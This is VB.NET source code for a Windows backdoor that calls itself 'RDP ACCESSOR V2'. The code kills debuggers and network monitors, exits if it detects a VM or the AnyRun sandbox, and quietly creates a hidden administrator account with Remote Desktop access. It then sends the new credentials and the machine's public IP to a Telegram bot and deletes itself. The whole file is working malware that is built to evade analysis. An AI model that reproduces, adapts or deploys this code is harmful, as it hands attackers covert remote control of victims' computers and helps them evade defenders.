Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Management
Imports System.Net

Namespace localhost
    Friend Module Program
        <STAThread>
        Private Sub Main()
            Call CheckAnalysis() ' Check AnyRun or Virtual Machine 
            Call CheckProcesses() ' Check forbidden processes: debuggers, network monitors and etc. . .

            Try
                Call createAdminUser() ' Create admin user
                Call allowRemoteAccess() ' Allowed remote accesses
                SendMessage("Job's done!") ' null function
                Call autoSeflDel() ' auto-self delete function
            Catch
                Call autoSeflDel() ' Autoself delete
                Return
            End Try


        End Sub
        Private Sub createAdminUser()
            Try
                AppendToSummary("Created Admin User")
                RunPS($"net user {newUserName} {newUserPass} /add")
                RunPS($"net localgroup administrators {newUserName} /add")
            Catch __unusedException1__ As Exception
                Throw
            End Try
        End Sub
        Private Sub allowRemoteAccess()
            Try
                AppendToSummary("Allowed Remote Access")
                RunPS($"net localgroup ""Remote Desktop Users"" {newUserName} /add")
            Catch __unusedException1__ As Exception
                Throw
            End Try
        End Sub

        Private Sub AppendToSummary(text As String)
            summaryMessage = summaryMessage & text & Environment.NewLine
        End Sub

        Private Sub SendMessage(text As String)
            Try
                Dim ram As String = GetRAM()
                Dim value As String = String.Concat(New String() {String.Concat(New String() {"===[ ]===[ RDP ACCESSOR V2 LOG ]===[ ]===", Environment.NewLine, summaryMessage, "[+]  Username => ", newUserName, Microsoft.VisualBasic.Constants.vbLf & "[+]  Password => ", newUserPass, Microsoft.VisualBasic.Constants.vbLf & "[+]  IP => ", [Get]("https://api.ipify.org/"), Microsoft.VisualBasic.Constants.vbLf & "[+]  RAM => ", ram, Microsoft.VisualBasic.Constants.vbLf & "[+]  Result => ", text, Microsoft.VisualBasic.Constants.vbLf & "===[ ]===[ NEW ADMIN-USER LOG ]===[ ]==="})})
                Using webClient As WebClient = New WebClient()
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
                    webClient.DownloadString(String.Concat(New String() {"https://api.telegram.org/bot", Token, "/sendMessage?chat_id=", ID, "&text=", WebUtility.UrlEncode(value)}))
                End Using
            Catch __unusedException1__ As Exception
                Throw
            End Try
        End Sub

        Private Sub CheckAnalysis()
            If AntiVM_Checker() Then
                Call autoSeflDel()
            End If

            If AnyRunDtc() Then
                Call autoSeflDel()
            End If
        End Sub

        ' CHECK FORBIDDEN PROCESSES AND CHECKING VIRTUAL MACHINES OR ANYRUN | START
        Public Function CheckProcesses() As Boolean ' Check Forbidden processes to kill
            Dim forbiddenProcesses = {"dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla", "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor", "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james", "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek", "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb", "kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker", "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector", "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse", "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor", "soap monitor", "ProcessHacker", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "Wireshark", "UninstallTool", "UninstallToolHelper", "ProcessHacker"}
            Dim processes = Process.GetProcesses()

            For Each processName In forbiddenProcesses
                For Each process In processes
                    If Equals(process.ProcessName.ToLower(), processName.ToLower()) Then
                        Try
                            process.Kill()
                            process.Dispose()
                        Catch
                        End Try


                        Return True
                    End If
                Next
            Next

            Return False
        End Function ' End function

        Private Function AnyRunDtc() As Boolean ' Check AnyRun
            Dim array = {"Acrobat Reader DC.lnk", "CCleaner.lnk", "FileZilla Client.lnk", "Firefox.lnk", "Google Chrome.lnk", "Skype.lnk", "Microsoft Edge.lnk"}

            For Each fileName In array
                If Not File.Exists(Path.Combine(Environment.ExpandEnvironmentVariables("%systemdrive%"), "Users", "Public", "Desktop", fileName)) Then
                    Return False
                End If
            Next

            If String.Equals(Environment.UserName.ToLower(), "admin", StringComparison.OrdinalIgnoreCase) AndAlso Environment.MachineName.Contains("USER-PC") Then
                Return True
            End If

            Return False
        End Function ' End function

        Private Function AntiVM_Checker() As Boolean ' Check Virtual Machine
            Dim vmProcesses = {"vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "vmacthlp", "vmsrvc", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray", "VBoxService", "VBoxTray"}

            Dim processes = Process.GetProcesses()

            For Each process In processes
                For Each processName In vmProcesses
                    If Equals(process.ProcessName.ToLower(), processName.ToLower()) Then
                        Return True
                    End If
                Next
            Next

            Return False
        End Function ' End Function

        ' END CHECKING


        Private Sub RunPS(args As String)
            Dim process As Process = New Process With {
                    .StartInfo = New ProcessStartInfo With {
        .FileName = "powershell",
        .Arguments = args,
        .WindowStyle = ProcessWindowStyle.Hidden,
        .CreateNoWindow = True
    }
}
            process.Start()
            process.WaitForExit()
        End Sub

        Private Function GetRAM() As String
            Try
                Dim num = 0
                Using managementObjectSearcher As ManagementObjectSearcher = New ManagementObjectSearcher("Select * From Win32_ComputerSystem")
                    Using enumerator As ManagementObjectCollection.ManagementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator()
                        If enumerator.MoveNext() Then
                            Dim managementObject = CType(enumerator.Current, ManagementObject)
                            Dim num2 = Convert.ToDouble(managementObject("TotalPhysicalMemory"))
                            num = CInt(num2 / 1048576.0) - 1
                        End If
                    End Using
                End Using
                Return num.ToString("#,GB")
            Catch __unusedException1__ As Exception
                Throw
            End Try
        End Function

        Private Function [Get](uri As String) As String
            Using client As WebClient = New WebClient()
                Dim result = client.DownloadString(uri)
                Return result
            End Using

        End Function


        Private Sub autoSeflDel()
            Dim fileName = Process.GetCurrentProcess().MainModule.FileName
            selfRemove(fileName, 1)
            Environment.Exit(0)
        End Sub


        Private Sub selfRemove(fileName As String, Optional delaySecond As Integer = 2)
            fileName = Path.GetFullPath(fileName)
            Dim folder = Path.GetDirectoryName(fileName)
            Dim currentProcessFileName = Path.GetFileName(fileName)

            Dim arguments = $"/c timeout /t {delaySecond} && DEL /f {currentProcessFileName} "

            Dim processStartInfo = New ProcessStartInfo() With {
    .FileName = "cmd",
    .UseShellExecute = False,
    .CreateNoWindow = True,
    .Arguments = arguments,
    .WorkingDirectory = folder
}

            Process.Start(processStartInfo)
        End Sub

        Public Token As String = "TOKENBOT"
        Public ID As String = "CHATIDUSER"
        Public newUserName As String = "RDPUSERNAME"
        Public newUserPass As String = "RDPPASSWORD"
        Public summaryMessage As String = ""
    End Module
End Namespace
